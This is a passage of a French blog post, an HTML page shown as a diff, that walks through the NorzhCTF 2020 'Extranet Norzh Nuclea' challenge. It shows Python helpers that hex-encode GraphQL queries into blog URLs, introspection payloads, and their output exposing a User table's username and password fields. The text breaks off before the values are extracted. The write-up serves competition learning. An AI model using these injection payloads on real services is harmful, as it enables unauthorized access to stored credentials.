@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="fr">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Norzh CTF 2020 - Extranet Norzh Nuclea - La sécurité à la française</title><meta name="author" content="Driikolu">
+<meta name="description" content="En janvier 2020, en marge du FIC, était organisé le NorzhCTF par l&rsquo;ENSIBS. Cette année je ne faisais pas partie des &ldquo;créateurs de challenges&rdquo; mais bien des participants avec mes amis Haax, Razaborg et L0n3w0lf.
+Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : Extranet Norzh Nuclea que vous pouvez retrouver sur le git du NorzhCTF.
+Énoncé On commence par lire l&rsquo;énoncé
+"><meta name="keywords" content='Hugo, FixIt'>
+  <meta itemprop="name" content="Norzh CTF 2020 - Extranet Norzh Nuclea">
+  <meta itemprop="description" content="En janvier 2020, en marge du FIC, était organisé le NorzhCTF par l’ENSIBS. Cette année je ne faisais pas partie des “créateurs de challenges” mais bien des participants avec mes amis Haax, Razaborg et L0n3w0lf.
+Durant ce CTF, je me suis tout particulièrement occupé d’un scénario : Extranet Norzh Nuclea que vous pouvez retrouver sur le git du NorzhCTF.
+Énoncé On commence par lire l’énoncé">
+  <meta itemprop="datePublished" content="2020-02-06T12:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-07-11T11:49:04+02:00">
+  <meta itemprop="wordCount" content="2179"><meta property="og:url" content="https://driikolu.fr/posts/nuclea-web-extranet/">
+  <meta property="og:site_name" content="La sécurité à la française">
+  <meta property="og:title" content="Norzh CTF 2020 - Extranet Norzh Nuclea">
+  <meta property="og:description" content="En janvier 2020, en marge du FIC, était organisé le NorzhCTF par l’ENSIBS. Cette année je ne faisais pas partie des “créateurs de challenges” mais bien des participants avec mes amis Haax, Razaborg et L0n3w0lf.
+Durant ce CTF, je me suis tout particulièrement occupé d’un scénario : Extranet Norzh Nuclea que vous pouvez retrouver sur le git du NorzhCTF.
+Énoncé On commence par lire l’énoncé">
+  <meta property="og:locale" content="fr">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-02-06T12:00:00+00:00">
+    <meta property="article:modified_time" content="2025-07-11T11:49:04+02:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Norzh CTF 2020 - Extranet Norzh Nuclea">
+  <meta name="twitter:description" content="En janvier 2020, en marge du FIC, était organisé le NorzhCTF par l’ENSIBS. Cette année je ne faisais pas partie des “créateurs de challenges” mais bien des participants avec mes amis Haax, Razaborg et L0n3w0lf.
+Durant ce CTF, je me suis tout particulièrement occupé d’un scénario : Extranet Norzh Nuclea que vous pouvez retrouver sur le git du NorzhCTF.
+Énoncé On commence par lire l’énoncé">
+      <meta name="twitter:site" content="@driikolu">
+<meta name="twitter:creator" content="@driikolu" /><meta name="application-name" content="Hugo FixIt Blog">
+<meta name="apple-mobile-web-app-title" content="Hugo FixIt Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://driikolu.fr/posts/nuclea-web-extranet/" title="Norzh CTF 2020 - Extranet Norzh Nuclea - La sécurité à la française" /><link rel="next" type="text/html" href="https://driikolu.fr/posts/install_arch_uefi/" title="Installation d&#39;Archlinux en UEFI &amp; chiffré" /><link rel="alternate" type="text/markdown" href="https://driikolu.fr/posts/nuclea-web-extranet/index.md" title="Norzh CTF 2020 - Extranet Norzh Nuclea - La sécurité à la française"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Norzh CTF 2020 - Extranet Norzh Nuclea",
+    "inLanguage": "fr",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/driikolu.fr\/posts\/nuclea-web-extranet\/"
+    },"genre": "posts","wordcount":  2179 ,
+    "url": "https:\/\/driikolu.fr\/posts\/nuclea-web-extranet\/","datePublished": "2020-02-06T12:00:00+00:00","dateModified": "2025-07-11T11:49:04+02:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Driikolu"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="La sécurité à la française"><img class="logo" src='favicon.ico' alt="La sécurité à la française" height="32" width="32"><span class="header-title-text">La sécurité à la française</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Rechercher des titres, des contenus..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Chercher">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Effacer">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Changer de Thème">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="La sécurité à la française"><img class="logo" src='favicon.ico' alt="La sécurité à la française" height="26" width="26"><span class="header-title-text">La sécurité à la française</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Rechercher des titres, des contenus..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Chercher">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Effacer">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Annuler
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Changer de Thème"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Norzh CTF 2020 - Extranet Norzh Nuclea</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="https://x.com/driikolu" title="Auteur"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img class="avatar" src='https://driikolu.fr/img/sloth.jpg' alt="Driikolu" height="16" width="16">&nbsp;Driikolu</a></span></div><div class="post-meta-line"><span title="publié le 2020-02-06 12:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2020-02-06">2020-02-06</time></span>&nbsp;<span title="Mis à jour le 2025-07-11 11:49:04"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-07-11">2025-07-11</time></span>&nbsp;<span title="2179 mots"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>environ 2200 mots</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>11 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contenus</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#trouver-la-table">Trouver la table</a></li>
+    <li><a href="#trouver-les-colonnes">Trouver les colonnes</a></li>
+    <li><a href="#récupérer-les-valeurs">Récupérer les valeurs</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>En janvier 2020, en marge du FIC, était organisé le NorzhCTF par l&rsquo;ENSIBS. Cette année je ne faisais pas partie des &ldquo;créateurs de challenges&rdquo; mais bien des participants avec mes amis <a href="https://twitter.com/Haaxmax"target="_blank" rel="external nofollow noopener noreferrer">Haax</a>, <a href="https://twitter.com/razaborg"target="_blank" rel="external nofollow noopener noreferrer">Razaborg</a> et <a href="https://twitter.com/AzrakelK"target="_blank" rel="external nofollow noopener noreferrer">L0n3w0lf</a>.</p>
+<p>Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : <strong>Extranet Norzh Nuclea</strong> que vous pouvez retrouver sur <a href="https://gitlab.com/norzhctf/norzhctf-2020"target="_blank" rel="external nofollow noopener noreferrer">le git du NorzhCTF</a>.</p>
+<h2 class="heading-element" id="énoncé"><span>Énoncé</span>
+  <a href="#%c3%a9nonc%c3%a9" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>On commence par lire l&rsquo;énoncé</p>
+<blockquote>
+<p>Vous avez trouvé l&rsquo;extranet de l&rsquo;entreprise.</p>
+<p>Ce challenge se décompose en 4 parties :</p>
+<ul>
+<li>Obtenir un accés à l&rsquo;interface administrateur</li>
+<li>Obtenir un shell sur la machine</li>
+<li>Obtenir un accès root sur la machine</li>
+<li>Obtenir le mot de passe de l&rsquo;utilisateur <code>web-dev</code></li>
+</ul></blockquote>
+<p>Globalement, ça ressemble à de l&rsquo;exploitation web puis une privesc système Linux&hellip; C&rsquo;est tout à fait ce que je sais faire, donc on va se lancer.</p>
+<h2 class="heading-element" id="obtenir-laccès-administrateur"><span>Obtenir l&rsquo;accès administrateur</span>
+  <a href="#obtenir-lacc%c3%a8s-administrateur" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Dans un premier temps on va un peu fouiller le site. On a 3 pages :</p>
+<ul>
+<li>Une page d&rsquo;accueil</li>
+<li>Une page de blog</li>
+<li>Une page de login</li>
+</ul>
+<p>La page d&rsquo;accueil ne me semble pas utile, je vais directement voir la page de blog.</p>
+<p><img loading="lazy" src='/img/Nuclea_blog.png' alt="Page de blog"></p>
+<p>Ici, ça commence à devenir interéssant. Lorsque l&rsquo;on regarde les liens des <em>blogposts</em> on obtient quelque chose comme ceci :</p>
+<blockquote>
+<p><a href="http://www.norzh.nuclea/blog/2f6772617068716c3f[...]6222297b5f6964207469746c6520636f6e74656e747d7d"target="_blank" rel="external nofollow noopener noreferrer">http://www.norzh.nuclea/blog/2f6772617068716c3f[...]6222297b5f6964207469746c6520636f6e74656e747d7d</a></p></blockquote>
+<p>Ça me paraît être quelque chose &ldquo;encodé&rdquo; en hexadécimal&hellip; On ouvre donc la console python, et on se fait une petite fonction pour décoder.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decode_hex</span><span class="p">(</span><span class="nb">hex</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">hex</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="nb">hex</span><span class="p">),</span><span class="mi">2</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">decode_hex</span><span class="p">(</span><span class="s2">&#34;2f6772617068716c3f71756572793d7175657279207b626c6f67706f7374285f69643a2235646632363961323338356538393838356265636234356222297b5f6964207469746c6520636f6e74656e747d7d&#34;</span><span class="p">))</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Et on obtient le résultat suivant :</p>
+<blockquote>
+<p>/graphql?query=query {blogpost(_id:&ldquo;5df269a2385e89885becb45b&rdquo;){_id title content}}</p></blockquote>
+<p>C&rsquo;est donc une requête GraphL, on peut le comprendre avec le <em>/graphql</em> et au contenu de <em>query</em>. La requête est sans doute interprétée par le serveur pour nous obtenir le blogpost voulu&hellip; On doit pouvoir faire une injection là dessus.</p>
+<h2 class="heading-element" id="trouver-la-table"><span>Trouver la table</span>
+  <a href="#trouver-la-table" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Je me suis donc un peu renseigné sur le sujet n&rsquo;en ayant jamais fait et je trouve rapidement ce qu&rsquo;il faut faire.</p>
+<p>Dans un premier temps, je me refait une petite fonction pour encoder toutes mes requêtes.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b16encode</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encode_hex</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">b16encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/graphql?query=query &#39;</span><span class="o">+</span><span class="nb">str</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="c1">#encode() et decode() pour gérer les byte-strings</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>La première étape pour obtenir le contenu de la base de données, c&rsquo;est d&rsquo;avoir toutes les tables présentes. En GrapQL ça s&rsquo;obtient avec la requête</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-graphql" data-lang="graphql"><span class="line"><span class="cl"><span class="p">{</span><span class="w"> </span><span class="py">__schema</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kd">type</span><span class="nc">s</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="py">name</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>On va encoder tout ça et le mettre dans notre URL.</p>
+<blockquote>
+<p><a href="http://www.norzh.nuclea/blog/2F6772617068716C3F7175657279[...]D61207B207479706573207B206E616D65207D207D207D"target="_blank" rel="external nofollow noopener noreferrer">http://www.norzh.nuclea/blog/2F6772617068716C3F7175657279[...]D61207B207479706573207B206E616D65207D207D207D</a></p></blockquote>
+<p>Et là on a un blogpost vide&hellip;</p>
+<p><img loading="lazy" src='/img/Nuclea_post_vide.png' alt="BlogPost vide"></p>
+<p>Pas d&rsquo;inquiétude à avoir, en fait l&rsquo;affichage est traité en js et le retour de notre requête n&rsquo;est pas celui attendu. Donc on a juste à ouvrir les sources de la page.</p>
+<p><img loading="lazy" src='/img/Nuclea_injection_viewsource.jpg' alt="Source du blogpost"></p>
+<p>On voit bien la table <strong>BlogPost</strong> qui sert à la requête de base, mais nous on va s&rsquo;intéresser à la ble <strong>User</strong>.</p>
+<p>Nos requêtes sont les suivantes :</p>
+<h2 class="heading-element" id="trouver-les-colonnes"><span>Trouver les colonnes</span>
+  <a href="#trouver-les-colonnes" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-GraphQL" data-lang="GraphQL"><span class="line"><span class="cl"><span class="p">{</span><span class="w"> </span><span class="py">__type</span><span class="p">(</span><span class="py">name</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;User&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nc">name</span><span class="w"> </span><span class="py">fields</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="py">name</span><span class="w"> </span><span class="kd">type</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nc">name</span><span class="w"> </span><span class="py">kind</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ici on récupère en plus les types de chaques colonnes</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-GraphQL" data-lang="GraphQL"><span class="line"><span class="cl"><span class="p">{</span><span class="s">&#34;__type&#34;</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;User&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;fields&#34;</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;_id&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="s">&#34;type&#34;</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;String&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="s">&#34;kind&#34;</span><span class="p">:</span><span class="s">&#34;SCALAR&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;username&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="s">&#34;type&#34;</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;String&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="s">&#34;kind&#34;</span><span class="p">:</span><span class="s">&#34;SCALAR&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;password&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="s">&#34;type&#34;</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;String&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="s">&#34;kind&#34;</span><span class="p">:</span><span class="s">&#34;SCALAR&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>En résumé, nous avons 3 colonnes:</p>
+<ul>
+<li>_id</li>
+<li>username</li>
+<li>password</li>
+</ul>
+<p>On veut, pour avancer, récupérer ces deux dernières.</p>
+<h2 class="heading-element" id="récupérer-les-valeurs"><span>Récupérer les valeurs</span>
+  <a href="#r%c3%a9cup%c3%a9rer-les-valeurs" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>On peut procéder de 2 manières :</p>
+<ul>
+<li>En requêtant toutes les valeurs de User une à une grâce à l&rsquo;id</li>
+<li>En requêtant l&rsquo;ensemble des valeurs de la table User.</li>
